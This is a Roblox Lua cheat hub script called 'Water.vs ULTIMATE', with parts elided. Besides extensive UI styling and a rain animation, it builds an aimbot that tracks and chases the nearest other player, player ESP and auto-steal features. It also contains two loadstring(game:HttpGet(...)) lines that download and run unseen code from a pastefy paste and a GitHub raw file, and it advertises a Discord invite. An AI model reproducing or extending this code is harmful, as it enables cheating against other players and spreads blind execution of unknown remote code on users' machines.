-- Water.vs ULTIMATE | Cyan Rain Edition | https://discord.gg/VyRHBRfB24
-- Heavily upgraded visuals • Multi-layer rain • Premium cyan UI
...
for _, name in ipairs({"WaterVS_Hub", "WaterVS_HubAlt", "WaterVS_Cyber"}) do
...
-- ============================================================
-- NUOVO INTRO (Uranium.cc) – modificato per "Water.vs"
-- ============================================================
...
-- ============================================================
-- INTRO SOURCE – modificato: "Water.vs" → "Water.vs"
-- ============================================================
local introSource = [[
-- uranium.cc intro (modified for Water.vs) | LocalScript standalone
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")
local UserInputService = game:GetService("UserInputService")
...
overlay.BackgroundColor3 = Color3.fromRGB(4, 12, 20)
...
vignette.ImageColor3 = Color3.fromRGB(4, 12, 20)
...
mainLabel.Text = "Water.vs"
mainLabel.TextColor3 = Color3.fromRGB(0, 210, 255)
mainLabel.TextStrokeColor3 = Color3.fromRGB(4, 12, 20)
...
leftLabel.Text = "Water.vs"
leftLabel.TextColor3 = Color3.fromRGB(0, 210, 255)
leftLabel.TextStrokeColor3 = Color3.fromRGB(4, 12, 20)
...
rightLabel.Text = "Hub"
rightLabel.TextColor3 = Color3.fromRGB(0, 210, 255)
rightLabel.TextStrokeColor3 = Color3.fromRGB(4, 12, 20)
...
beamSparkles.BackgroundColor3 = Color3.fromRGB(0, 210, 255)
...
flashFrame.BackgroundColor3 = Color3.fromRGB(0, 210, 255)
...
local function skipIntro()
	...
	doFlash(Color3.fromRGB(0, 210, 255), 0.8, 0.1)
...
local function playIntro()
	...
	while tick() < glitchEnd and not introSkipped do
		...
		if math.random() < 0.35 then task.spawn(glitchText, leftLabel, "Water.vs") end
	...
	doFlash(Color3.fromRGB(0, 210, 255), 0.95, 0.05)
	task.wait(0.02)
	...
	task.wait(0.1)
	doFlash(Color3.fromRGB(0, 210, 255), 0.3, 0.04)
...
savedConfig = {}
_G.WaterVS_GuiLocked = _G.WaterVS_GuiLocked == true
_G.WaterVS_HideMobileButtons = _G.WaterVS_HideMobileButtons == true
_G.WaterVS_MobileButtonScale = 0.75
_G.WaterVS_MobileButtonPositions = _G.WaterVS_MobileButtonPositions or {}
...
function collectWaterVS_MobileButtonPositions()
	local out = {}
	for key, entry in pairs(_G.WaterVS_MobileButtonRefs or {}) do
		local holder = entry and entry.holder
		if holder then out[key] = udim2ToTable(holder.Position) end
	end
	if next(out) == nil and type(_G.WaterVS_MobileButtonPositions) == "table" then
		return _G.WaterVS_MobileButtonPositions
	end
	_G.WaterVS_MobileButtonPositions = out
	return out
end
...
function collectAceConfig()
	return {
		...
		guiLocked = _G.WaterVS_GuiLocked == true,
		hideMobileButtons = _G.WaterVS_HideMobileButtons == true,
		aceMobileButtonScale = _G.WaterVS_MobileButtonScale,
		mobileButtonPositions = collectWaterVS_MobileButtonPositions(),
...
function loadAceConfig()
	...
	savedMiniPositionTable = nil
	_G.WaterVS_GuiLocked = data.guiLocked == true
	_G.WaterVS_HideMobileButtons = data.hideMobileButtons == true
	_G.WaterVS_MobileButtonScale = math.clamp(tonumber(data.aceMobileButtonScale) or tonumber(_G.WaterVS_MobileButtonScale) or 0.75, 0.30, 1.35)
	_G.WaterVS_MobileButtonPositions = type(data.mobileButtonPositions) == "table" and data.mobileButtonPositions or {}
...
loadstring(game:HttpGet("https://pastefy.app/xMxM83CK/raw"))()

-- ============================================================
-- ANTI-BYPASS AIMBOT (ex Bat V2) - separate toggle
-- ============================================================
local antiBypassConfig = {
	Speed       = 59,
	VertSpeed   = 52,
	Dist        = -2.8,
	Height      = 4.75,
...
local function getAntiBypassTarget()
	...
	if not root then return nil end
	local now = tick()
	if now - antiBypass.lastScan <= 0.1 and antiBypass.target and antiBypass.target.Parent then
		local hum = antiBypass.target.Parent:FindFirstChildOfClass("Humanoid")
		if hum and hum.Health > 0 then return antiBypass.target end
	end
	antiBypass.lastScan = now
	antiBypass.target = nil
	local closest, minDist = nil, math.huge
	for _, plr in ipairs(Players:GetPlayers()) do
		if plr ~= LP and plr.Character then
			local tRoot = plr.Character:FindFirstChild("HumanoidRootPart")
	...
	antiBypass.target = closest
	return antiBypass.target
end
...
local function ensureAntiBypassEquipped()
	local char = LP.Character
	if not char then return end
...
local function antiBypassTick()
	if not antiBypass.enabled then return end
	local char = LP.Character
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	local root = char and char:FindFirstChild("HumanoidRootPart")
	if not root or not hum then return end

	if not antiBypass.equipped then
		antiBypass.equipped = true
		ensureAntiBypassEquipped()
	end

	local target = getAntiBypassTarget()
	if target then
		local aimTargetPos = target.Position + Vector3.new(0, antiBypassConfig.VertOffset, 0)
		...
		if look.Magnitude > 0.01 and flatLook.Magnitude > 0.01 then
			...
			local yawRate = math.clamp(math.rad(yawDelta) * antiBypassConfig.TurnSpeed, -antiBypassConfig.MaxTurnRate, antiBypassConfig.MaxTurnRate)
			local pitchRate = math.clamp(math.rad(pitchDelta) * antiBypassConfig.TurnSpeed, -antiBypassConfig.MaxTurnRate, antiBypassConfig.MaxTurnRate)
		...
		local standPos = aimTargetPos - (dir * antiBypassConfig.Dist) + Vector3.new(0, antiBypassConfig.Height, 0)
		local moveDir = standPos - root.Position
		local hDir = Vector3.new(moveDir.X, 0, moveDir.Z)
		local hVel = hDir.Magnitude > 0.1 and hDir.Unit * antiBypassConfig.Speed or Vector3.zero
		local vVel = math.abs(moveDir.Y) > 0.1
			and Vector3.new(0, math.sign(moveDir.Y) * antiBypassConfig.VertSpeed, 0)
...
function _G.AceStartAntiBypassAimbot()
	...
	antiBypass.equipped = false
	antiBypass.enabled = true
	antiBypass.conn = RunService.Heartbeat:Connect(antiBypassTick)
	if _G.AceRefreshAimbotVisual then _G.AceRefreshAimbotVisual() end
	return true
end
...
loadstring(game:HttpGet("https://raw.githubusercontent.com/api-jnkie-com/scripts/main/Rifd.lua"))()
...
local function setupOverheadInfo(char)
	...
	ragdollCountdownLabel.TextStrokeColor3 = Color3.fromRGB(4, 12, 20)
	...
	discordLbl.Text = "discord.gg/VyRHBRfB24"
	discordLbl.TextColor3 = Color3.fromRGB(0, 210, 255)
	discordLbl.TextStrokeColor3 = Color3.fromRGB(4, 12, 20)
	...
	overheadSpeedLabel.TextColor3 = Color3.fromRGB(0, 210, 255)
	overheadSpeedLabel.TextStrokeColor3 = Color3.fromRGB(4, 12, 20)
...
local COLORS = {
	bg = Color3.fromRGB(3, 8, 16),
	row = Color3.fromRGB(6, 16, 28),
	row2 = Color3.fromRGB(8, 20, 34),
	stroke = Color3.fromRGB(0, 200, 255),
	strokeSoft = Color3.fromRGB(0, 140, 190),
	white = Color3.fromRGB(230, 250, 255),
	textDim = Color3.fromRGB(100, 190, 230),
	toggleBg = Color3.fromRGB(8, 24, 40),
	knob = Color3.fromRGB(0, 220, 255),
	accent = Color3.fromRGB(0, 220, 255),
	whiteDim = Color3.fromRGB(150, 220, 245),
	glow = Color3.fromRGB(0, 255, 255),
}
-- ============================================================
-- COLOUR SCHEME SYSTEM (updated to also affect steal bar, ESP, etc.)
-- ============================================================
_G.WaterVS_ThemeColor = Color3.fromRGB(0, 220, 255)  -- premium cyan (Water.vs Ultimate)
...
local ACE_COLOUR_SCHEMES = {
	...
	{ name = "Aqua",    color = Color3.fromRGB(0, 230, 255) },
	{ name = "Teal",    color = Color3.fromRGB(0, 200, 220) },
	{ name = "White",   color = Color3.fromRGB(220, 245, 255) },
	{ name = "Green",   color = Color3.fromRGB(40, 230, 160) },
	{ name = "Blue",    color = Color3.fromRGB(60, 150, 255) },
	{ name = "Purple",  color = Color3.fromRGB(140, 100, 255) },
	{ name = "Pink",    color = Color3.fromRGB(200, 120, 255) },
	{ name = "Orange",  color = Color3.fromRGB(255, 160, 60)  },
	{ name = "Black",   color = Color3.fromRGB(140, 160, 180) },
}
_G.AceColourSchemes = ACE_COLOUR_SCHEMES

function _G.WaterVS_ApplyThemeColor(newColor)
	_G.WaterVS_ThemeColor = newColor
...
function makeDraggable(frame)
	...
	frame.InputBegan:Connect(function(input)
		if _G.WaterVS_GuiLocked == true then return end
...
savedMiniPositionTable = nil
MiniFrame.BackgroundColor3 = Color3.fromRGB(4, 12, 20)
...
MiniButton.Text = "W.VS"
MiniButton.TextColor3 = Color3.fromRGB(0, 210, 255)
MiniButton.TextStrokeColor3 = Color3.fromRGB(4, 12, 20)
...
MiniShade.BackgroundColor3 = Color3.fromRGB(4, 12, 20)
...
currentBackground = tonumber(savedConfig.currentBackground) or 1  -- default 1

-- Main GUI background image – predefinito al nuovo ID
...
BgImage.ZIndex = 1
BgImage.Parent = Main
BgImage.Image = "rbxassetid://129700697019613"  -- default image
corner(BgImage, 14)
...
function applyBackground(index)
	...
	elseif currentBackground >= 1 and currentBackground <= #BackgroundIDs then
		...
		BgImage.Visible = true
		Main.BackgroundColor3 = Color3.fromRGB(4, 12, 20)
		saveAceConfig()
		return "Image " .. tostring(currentBackground)
	end
	-- fallback al default
	BgImage.Image = "rbxassetid://129700697019613"
	BgImage.Visible = true
	Main.BackgroundColor3 = Color3.fromRGB(4, 12, 20)
	saveAceConfig()
	return "Default"
...
Title.TextStrokeColor3 = Color3.fromRGB(0, 40, 60)
...
-- Premium cyan accent line under title
local TitleAccent = Instance.new("Frame")
TitleAccent.Name = "TitleAccent"
TitleAccent.Size = UDim2.new(0, 92, 0, 2)
TitleAccent.Position = UDim2.new(0, 16, 0, 52)
TitleAccent.BackgroundColor3 = Color3.fromRGB(0, 220, 255)
TitleAccent.BackgroundTransparency = 0.15
...
accentGlow.Color = Color3.fromRGB(0, 255, 255)
accentGlow.Thickness = 1.5
accentGlow.Transparency = 0.6
accentGlow.Parent = TitleAccent

local Discord = Instance.new("TextLabel")
Discord.Name = "Discord"
Discord.BackgroundTransparency = 1
Discord.Size = UDim2.new(1, -118, 0, 18)
Discord.Position = UDim2.new(0, 16, 0, 58)
Discord.Text = "discord.gg/VyRHBRfB24  •  Ultimate"
Discord.TextColor3 = Color3.fromRGB(235, 235, 245)
Discord.Font = Enum.Font.Bangers
Discord.TextSize = 14
Discord.TextXAlignment = Enum.TextXAlignment.Left
Discord.TextStrokeColor3 = Color3.fromRGB(4, 12, 20)
...
Close.Name = "Close"
Close.BackgroundColor3 = Color3.fromRGB(4, 12, 20)
...
AceLockTopButton.BackgroundColor3 = Color3.fromRGB(4, 12, 20)
...
function AceUpdateGuiLockVisual()
	if AceLockTopButton then
		AceLockTopButton.Text = (_G.WaterVS_GuiLocked == true) and "UNLOCK" or "LOCK"
		AceLockTopButton.BackgroundTransparency = (_G.WaterVS_GuiLocked == true) and 0.08 or 0.28
		local st = AceLockTopButton:FindFirstChildOfClass("UIStroke")
		if st then
			st.Transparency = (_G.WaterVS_GuiLocked == true) and 0.08 or 0.35
			st.Color = (_G.WaterVS_GuiLocked == true) and Color3.fromRGB(0, 210, 255) or COLORS.stroke
		end
	end
	if setLockGuiVisual then pcall(setLockGuiVisual, _G.WaterVS_GuiLocked == true) end
end
AceLockTopButton.Activated:Connect(function()
	_G.WaterVS_GuiLocked = not (_G.WaterVS_GuiLocked == true)
...
-- ============================================================
-- TABS MOVED TO BOTTOM with CYAN THEME (mini logo ingrandito)
-- ============================================================
...
for i, name in ipairs(tabNames) do
	...
	btn.TextStrokeColor3 = Color3.fromRGB(4, 12, 20)
...
function section(parent, text, order)
	...
	label.TextStrokeColor3 = Color3.fromRGB(4, 12, 20)
...
function animationPackRow(parent, order)
	...
	animationPackValueLabel.TextStrokeColor3 = Color3.fromRGB(4, 12, 20)
...
function modeDisplayRow(parent, order, side)
	...
	value.TextColor3 = Color3.fromRGB(0, 210, 255)
	value.TextStrokeColor3 = Color3.fromRGB(4, 12, 20)
...
function autoStealSelectorRow(parent, order)
	...
	normalText.TextStrokeColor3 = Color3.fromRGB(4, 12, 20)
	...
	semiText.TextStrokeColor3 = Color3.fromRGB(4, 12, 20)
...
do
	...
	PlayerESP = PlayerESP or {enabled=false, playerData={}, conns={}, discordText="discord.gg/VyRHBRfB24"}
	...
	function _aceEspColor()
		return _G.WaterVS_ThemeColor or Color3.fromRGB(230,230,230)
	end
...
function __AceDuelsSetupVisualsUI()
	...
	function skyThemeSelectorRow(parent, order)
		...
		holder.BackgroundColor3 = Color3.fromRGB(4, 12, 20)
		holder.BackgroundTransparency = 0.28
		holder.BorderSizePixel = 0
		...
		skyValueLabel.TextStrokeColor3 = Color3.fromRGB(4, 12, 20)
	...
	do
		...
		local function makeSwatchRow(parent, startIdx, endIdx, order)
			...
			for i = startIdx, endIdx do
				...
				swSt.Color = Color3.fromRGB(0, 210, 255)
				swSt.Thickness = 1.2
				...
				nameLabel.TextColor3 = Color3.fromRGB(180, 230, 250)
				...
				btn.Activated:Connect(function()
					selectedSchemeIndex = i
					_G.WaterVS_ApplyThemeColor(scheme.color)
...
-- Restore saved colour scheme (se presente)
do
	...
	if r and g2 and b2 then
		task.spawn(function()
			task.wait(0.1)
			pcall(function() _G.WaterVS_ApplyThemeColor(Color3.new(r, g2, b2)) end)
		end)
	end
end
...
_G.__AceDuelsSetupSettingsUI = function()
	...
	do
		local row, setVisual = _G.AceActionToggleRow(Settings, "Lock GUI", _G.WaterVS_GuiLocked == true, 7)
		setLockGuiVisual = setVisual
		local btn = row and row:FindFirstChild("ToggleButton")
		if btn then
			btn.Activated:Connect(function()
				_G.WaterVS_GuiLocked = not (_G.WaterVS_GuiLocked == true)
				if setVisual then setVisual(_G.WaterVS_GuiLocked == true) end
	...
	do
		local row, setVisual = _G.AceActionToggleRow(Settings, "Hide Mobile Buttons", _G.WaterVS_HideMobileButtons == true, 8)
		setHideMobileButtonsVisual = setVisual
		local btn = row and row:FindFirstChild("ToggleButton")
		if btn then
			btn.Activated:Connect(function()
				_G.WaterVS_HideMobileButtons = not (_G.WaterVS_HideMobileButtons == true)
				if setVisual then setVisual(_G.WaterVS_HideMobileButtons == true) end
				if _G.WaterVS_ApplyMobileButtonsHidden then _G.WaterVS_ApplyMobileButtonsHidden() end
				saveAceConfig()
			end)
		end
	end
	...
	stepperRow(Settings, "Mobile Buttons Size", tonumber(_G.WaterVS_MobileButtonScale) or 0.75, 9, function(v)
		_G.WaterVS_MobileButtonScale = math.clamp(tonumber(v) or 0.35, 0.30, 1.35)
		if _G.WaterVS_ApplyMobileButtonSize then _G.WaterVS_ApplyMobileButtonSize() end
		saveAceConfig()
	end, 0.30, 1.35)
	do
		...
		button.Text = "RESET"
		button.TextColor3 = Color3.fromRGB(4, 12, 20)
		button.TextSize = 11
		...
		button.Parent = row
		corner(button, 8)
		stroke(button, Color3.fromRGB(0, 210, 255), 1, 0.18)
		button.Activated:Connect(function()
			if _G.WaterVS_ResetMobileButtons then
				_G.WaterVS_ResetMobileButtons()
			else
				_G.WaterVS_MobileButtonScale = 0.75
				_G.WaterVS_HideMobileButtons = false
				if _G.WaterVS_ApplyMobileButtonsHidden then _G.WaterVS_ApplyMobileButtonsHidden() end
				if _G.WaterVS_ApplyMobileButtonSize then _G.WaterVS_ApplyMobileButtonSize() end
				saveAceConfig()
			end
	...
	resetBtn.TextColor3 = Color3.fromRGB(4, 12, 20)
	...
	resetStroke.Color = Color3.fromRGB(0, 210, 255)
	...
	local resetDefaultText = Color3.fromRGB(4, 12, 20)
	...
	function setResetDefaultTheme()
		...
		tween(resetStroke, {Color = Color3.fromRGB(0, 210, 255), Transparency = 0.12, Thickness = 1}, 0.18)
	end
	...
	resetBtn.MouseButton1Click:Connect(function()
		...
		pcall(function()
			...
			_G.WaterVS_GuiLocked = false; _G.WaterVS_HideMobileButtons = false; _G.WaterVS_MobileButtonScale = 0.75
			aceMainScale.Scale = aceGuiScaleValue
			applyAceProgressBarScale()
			applyBackground(0)
			updateBackgroundButtons()
			...
			if _G.WaterVS_ResetMobileButtons then _G.WaterVS_ResetMobileButtons() end
...
_G.__AceDuelsSetupStealBar = function()
	...
	pbFrame.BackgroundColor3 = Color3.fromRGB(4, 12, 20)
	...
	infoLbl.Text = "FPS 0 Ping 0 discord.gg/VyRHBRfB24"
	...
	RunService.RenderStepped:Connect(function(dt)
		...
		infoLbl.Text = string.format("FPS %d Ping %d discord.gg/VyRHBRfB24", fpsValue, ping)
		radiusLbl.Text = "Radius: " .. tostring(autoStealRadius)
	end)
...
_G.AceDuelsForceSyncLoadedButtons = function()
	...
	pcall(function()
		if _G.WaterVS_ThemeColor then
			_G.WaterVS_ApplyThemeColor(_G.WaterVS_ThemeColor)
		end
	end)
	pcall(saveAceConfig)
end
...
task.defer(function()
	...
	local old = PlayerGui:FindFirstChild("WaterVS_MobileButtons")
	if old then old:Destroy() end

	local mobileGui = Instance.new("ScreenGui")
	mobileGui.Name = "WaterVS_MobileButtons"
	...
	_G.WaterVS_MobileButtonRefs = {}
	local mobileButtons = _G.WaterVS_MobileButtonRefs

	local BG_OFF    = Color3.fromRGB(5, 14, 26)
	local BG_ON     = _G.WaterVS_ThemeColor or Color3.fromRGB(0, 220, 255)
	local TXT_OFF   = Color3.fromRGB(170, 235, 255)
	local TXT_ON    = Color3.fromRGB(2, 10, 18)
	local BORDER    = Color3.fromRGB(0, 90, 130)
	local BORDER_ACT= _G.WaterVS_ThemeColor or Color3.fromRGB(0, 220, 255)
	local DOT_OFF   = Color3.fromRGB(0, 120, 170)
	local DOT_ON    = Color3.fromRGB(2, 10, 18)

	-- Keep BG_ON/BORDER_ACT in sync with theme changes
	local _prevAceApplyTheme = _G.WaterVS_ApplyThemeColor
	_G.WaterVS_ApplyThemeColor = function(newColor)
		BG_ON = newColor
		BORDER_ACT = newColor
		-- Refresh all mobile buttons to apply new colour
		if _G.WaterVS_MobileButtonRefs then
			for _, entry in pairs(_G.WaterVS_MobileButtonRefs) do
	...
	function _G.WaterVS_ApplyMobileButtonsHidden()
		local g = PlayerGui:FindFirstChild("WaterVS_MobileButtons")
		if g then g.Enabled = not (_G.WaterVS_HideMobileButtons == true) end
		if setHideMobileButtonsVisual then pcall(setHideMobileButtonsVisual, _G.WaterVS_HideMobileButtons == true) end
	end

	function _G.WaterVS_ApplyMobileButtonSize()
		_G.WaterVS_MobileButtonScale = math.clamp(tonumber(_G.WaterVS_MobileButtonScale) or 0.75, 0.30, 1.35)
		for _, entry in pairs(mobileButtons) do
			...
			if holder then
				...
				sc.Scale = _G.WaterVS_MobileButtonScale
				sc.Parent = holder
			end
		end
		pcall(function()
			local gui = PlayerGui:FindFirstChild("WaterVS_Hub") or PlayerGui:FindFirstChild("WaterVS_HubAlt") or PlayerGui:FindFirstChild("WaterVS_Cyber")
			...
			for _, obj in ipairs(root:GetDescendants()) do
				if obj.Name == "Mobile Buttons Size" then
					...
					if valueBox and valueBox:IsA("TextLabel") then
						valueBox.Text = string.format("%.2f", _G.WaterVS_MobileButtonScale)
					end
				end
			end
		end)
	...
	local function setActive(btn, state)
		...
		if st then
			TS:Create(st, TweenInfo.new(0.14, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
				Color = state and BORDER_ACT or BORDER,
				Transparency = state and 0.05 or 0.55,
				Thickness = state and 1.6 or 1.1,
			}):Play()
		end
		if dot then
			TS:Create(dot, TweenInfo.new(0.14, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
	...
	local function makeButton(key, label, pos, onPress)
		...
		holder.Position = tableToUDim2(_G.WaterVS_MobileButtonPositions[key], pos)
		...
		UIS.InputChanged:Connect(function(i)
			if _G.WaterVS_GuiLocked == true or not pressing then return end
	...
	function _G.WaterVS_ResetMobileButtons()
		_G.WaterVS_MobileButtonScale = 0.75
		_G.WaterVS_HideMobileButtons = false
	...
	_G.WaterVS_ApplyMobileButtonSize()
	_G.WaterVS_ApplyMobileButtonsHidden()
...
-- ============================================================
-- WATER.VS ULTIMATE RAIN SYSTEM
-- Multi-layer • Soft glow • Bottom splash • High density • Smooth
-- ============================================================
task.spawn(function()
	local TS = game:GetService("TweenService")
	...
	local function makeSplash(container, x, y)
		...
		splash.Size = UDim2.fromOffset(3, 3)
		splash.Position = UDim2.fromOffset(x - 1, y - 1)
		splash.BackgroundColor3 = Color3.fromRGB(0, 240, 255)
		splash.BackgroundTransparency = 0.25
		splash.BorderSizePixel = 0
		splash.ZIndex = 4
		splash.Parent = container
		Instance.new("UICorner", splash).CornerRadius = UDim.new(1, 0)

		local tw = TS:Create(splash, TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			Size = UDim2.fromOffset(14, 4),
			Position = UDim2.fromOffset(x - 7, y - 1),
			BackgroundTransparency = 1,
		})
		tw:Play()
	...
	local function spawnDrop(rainCont, splashCont, abs, isHeavy)
		if not rainCont or not rainCont.Parent then return end
		if activeDrops >= MAX_DROPS then return end
		activeDrops = activeDrops + 1

		local w = isHeavy and math.random(2, 3) or 1
		local h = isHeavy and math.random(16, 28) or math.random(9, 16)
		local drop = Instance.new("Frame")
		drop.Name = "RainDrop"
		drop.Size = UDim2.fromOffset(w, h)
		drop.BackgroundColor3 = isHeavy and Color3.fromRGB(0, 235, 255) or Color3.fromRGB(80, 210, 255)
		drop.BackgroundTransparency = isHeavy and 0.15 or math.random(40, 65) / 100
		drop.BorderSizePixel = 0
		drop.ZIndex = isHeavy and 4 or 3
		...
		local drift = math.random(-22, 14)
		drop.Position = UDim2.fromOffset(startX, -h - 6)

		local duration = isHeavy and math.random(7, 12) / 10 or math.random(11, 19) / 10
		local endY = abs.Y + 6

		local tw = TS:Create(drop, TweenInfo.new(duration, Enum.EasingStyle.Linear), {
		...
		tw.Completed:Connect(function()
			...
			if splashCont and splashCont.Parent and math.random() < 0.55 then
				makeSplash(splashCont, startX + drift, abs.Y - 6)
			end
	...
	-- Dense continuous rain
	while true do
		local gui = LP:FindFirstChild("PlayerGui") and (
			LP.PlayerGui:FindFirstChild("WaterVS_Hub")
			or LP.PlayerGui:FindFirstChild("WaterVS_HubAlt")
			or LP.PlayerGui:FindFirstChild("WaterVS_Cyber")
		)
		local main = gui and (gui:FindFirstChild("Main") or gui:FindFirstChildWhichIsA("Frame"))
		if main and main.Parent then
			local abs = main.AbsoluteSize
			if abs.X > 50 and abs.Y > 50 then
				local rainCont, splashCont = ensureContainers(main)
				local heavy = math.random(1, 3)
				local light = math.random(3, 7)
				for _ = 1, heavy do
					spawnDrop(rainCont, splashCont, abs, true)
				end
				for _ = 1, light do
					spawnDrop(rainCont, splashCont, abs, false)
				end
			end
		end
...
-- Soft ambient vignette pulse on the main frame (subtle premium feel)
task.spawn(function()
	task.wait(2)
	while true do
		local gui = LP:FindFirstChild("PlayerGui") and (
		...
		if main then
			...
			if stroke then
				local base = stroke.Transparency
				local tw = game:GetService("TweenService"):Create(stroke, TweenInfo.new(2.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
					Transparency = math.clamp(base + 0.08, 0, 0.85)
				})
				tw:Play()
				tw.Completed:Wait()
				local tw2 = game:GetService("TweenService"):Create(stroke, TweenInfo.new(2.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
					Transparency = base
				})
				tw2:Play()
				tw2.Completed:Wait()
...
print("[Water.vs] ══════════════════════════════════════")
print("[Water.vs]   ULTIMATE  •  Cyan Rain Edition")
print("[Water.vs]   Multi-layer rain + premium UI")
print("[Water.vs] ══════════════════════════════════════")
